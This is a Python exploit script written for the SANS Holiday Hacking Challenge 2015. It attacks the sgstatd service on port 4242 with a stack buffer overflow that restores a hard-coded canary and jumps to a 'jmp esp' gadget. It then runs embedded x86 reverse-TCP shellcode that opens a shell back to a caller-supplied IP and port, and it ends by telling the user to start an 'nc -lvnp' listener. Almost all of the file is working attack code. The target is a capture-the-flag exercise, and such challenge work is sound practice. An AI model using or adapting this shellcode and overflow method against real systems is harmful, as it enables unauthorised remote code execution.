#!/usr/bin/python
#
# Exploit Title: SANS Holiday Hacking Challenge GIYH SG05 sgstatd Exploit
# Date: 12/2015
# Exploit Author: @deckerXL
# Version: 1.1
# Tested on: sg05
# Description: This will perform a buffer overflow attack on the sgstatd (supergnome statd) process running on port 4242/tcp, bypassing an application-level stack canary and ASLR

import sys
import struct
from socket import *

def usage():
	print "\nUsage: ./giyh-sg05-sgstatd-pwn.py <target_ip> <target_ip> <callback_ip> <callback_port> [-d]\n"
	sys.exit(1)

def pmsg( str, code ):
	if ( code == 0 ):
		print "        [*] "+str	# Status message
	elif ( code == 1):
		print "        [+] "+str	# Success message
	elif ( code == 2):
		print "        [-] "+str	# Error message
	else:
		pass

def banner():
	print ""
	print "       =[ ----------------------------------------------- ]"
	print "+ -- --=[ GIYH SG05 sgstatd Exploit                       ]"
	print "       =[                                     by deckerXL ]"
	print "       =[ ----------------------------------------------- ]"
	print "                                                    __     "
	print "                                                 .-'  |    "
	print "                                                /   <\|    "
	print "                                               /     \'    "
	print "                                               |_.- o-o    "
	print "                                               / C  -._)\  "
	print "          ________.________.___. ___ ___      /',        | "
        print "         /  _____/|   \__  |   |/   |   \    |   `-,_,__,' "
        print "        /   \  ___|   |/   |   /    ~    \   (,,)====[_]=| "
        print "        \    \_\  \   |\____   \    Y    /     '.   ____/  "
        print "         \______  /___|/ ______|\___|_  /       | -|-|_    "
        print "                \/     \/             \/        |____)_)   "
	print ""

# =============================================================
# Take in command line parameters
# =============================================================
argc = len(sys.argv)
if (argc < 5 or argc > 6):
	usage()

debug = 0
target_ip     = sys.argv[1][0:15]
target_port   = int(sys.argv[2][0:5])
callback_ip   = sys.argv[3][0:15]
callback_port = int(sys.argv[4][0:5])

if ('-d' in sys.argv):
	debug = 1

banner()

# =============================================================
# Error checking input parameters
# =============================================================
pmsg ("Checking input parameters",0)
try:
	inet_aton(target_ip)
except error:
	pmsg ("ERROR: Invalid target ip address specified: ["+str(target_ip)+"].",2)
	usage()

try:
	inet_aton(callback_ip)

except error:
	pmsg ("ERROR: Invalid callback ip address specified: ["+str(callback_ip)+"].",2)
	usage()

if (target_port < 0 or target_port > 65535 ):
	pmsg ("ERROR: Invalid target port specified: ["+str(target_port)+"]. Target port must be between 0-65535.",2)
	usage()

if (callback_port < 0 or callback_port > 65535 ):
	pmsg ("ERROR: Invalid callback port specified: ["+str(callback_port)+"]. Callback port must be between 0-65535.",2)
	usage()

pmsg ("Input parameters valid",1)
# =============================================================
# Convert callback ip address and port to packed little endian and add to reverse tcp shellcode
# =============================================================
pmsg ("Converting callback ip address and port to pack struct LSB",0)
hexcbip   = struct.pack('>L', int('{:02X}{:02X}{:02X}{:02X}'.format(*map(int, callback_ip.split('.'))),16))
hexcbport = struct.pack('>H',callback_port)

pmsg ("Building Shellcode",0)

# x86 reverse tcp connection shellcode
# setuid(0) + setgid(0) header shellcode (doesn't work)- "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80"\ 
sc = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80"\
     "\x92\xb0\x66\x68"+hexcbip+"\x66\x68"+hexcbport+"\x43\x66\x53\x89"\
     "\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0"\
     "\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73"\
     "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# =============================================================
# Establish socket connection to target ip and target port
# =============================================================
pmsg ("Trying to connect to target host "+target_ip+" on port "+str(target_port),0)
s = socket(AF_INET, SOCK_STREAM)
s.settimeout(30)
try:
	s.connect((target_ip, target_port))
except:
	pmsg ("ERROR: Not able to connect to provided target ip address / port.\n",2)
	sys.exit(1)

# =============================================================
# Read in the giyh sgstatd menu
# =============================================================
pmsg ("Connection successful - Reading giyh SG05 sgstatd menu",1)
menudata = ""
while (len(menudata) < 176):
	menudata += s.recv(1)

if (debug):
	pmsg ("DEBUG: Received ["+menudata+"]",0)

# =============================================================
# Send the secret input for option 88 (aka. 'X' in ascii)
# =============================================================
pmsg ("Sending secret option 88 (ascii 'X')",0)
s.send("X")
messagedata = ""
while (len(messagedata) < 136):
	messagedata += s.recv(1)

if (debug):
	pmsg ("DEBUG: Received ["+messagedata+"]",0)

# =============================================================
# Send the payload overflowing the buffer, overwriting the 
# canary, and setting EIP to the address of 'jmp esp' to 
# execute the reverse tcp shellcode that follows
# =============================================================
pmsg ("Sending buffer payload with exploit...",0)
buf = ""
buf += "A"*104
buf += struct.pack('<L', 0xe4ffffe4)        # Repair sgstatd Canary
buf += struct.pack('<L', 0x08048aa0)        # Pointing EBP to address of <exit@plt> for clean exit on ret

rop = struct.pack('<L', 0x0804936b)         # jmp esp - Address obtained with objdump of sgstatd binary

buf += rop + sc                             # Final buffer with shellcode

s.send (buf)
s.close()

pmsg ("Check your netcat listener. Should be run like this: nc -lvnp "+str(callback_port),0)
print ""

sys.exit(0)
